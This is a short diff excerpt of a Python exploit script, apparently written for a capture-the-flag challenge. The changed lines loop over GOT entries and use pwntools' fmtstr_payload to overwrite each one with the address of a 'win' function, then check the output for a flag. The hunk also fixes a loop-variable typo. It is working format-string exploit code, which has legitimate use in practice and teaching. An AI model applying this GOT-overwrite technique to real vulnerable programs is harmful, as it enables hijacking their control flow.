@@ -53,11 +53,10 @@ def exploit(binary):
         flag = re.findall(flag_regex, output.decode('unicode_escape'))
         
         if flag: # Success
-            #print('putchar')
             return flag[0] #I'm going to loop through the other GOT entries just in case.
        
-    for irem in got_entries:
-        payload = fmtstr_payload(index, {got_entries.pop(item): e.sym['win']}, 0)
+    for item in got_entries:
+        payload = fmtstr_payload(index, {got_entries[item]: e.sym['win']}, 0)
     
         p.sendline(payload)
 
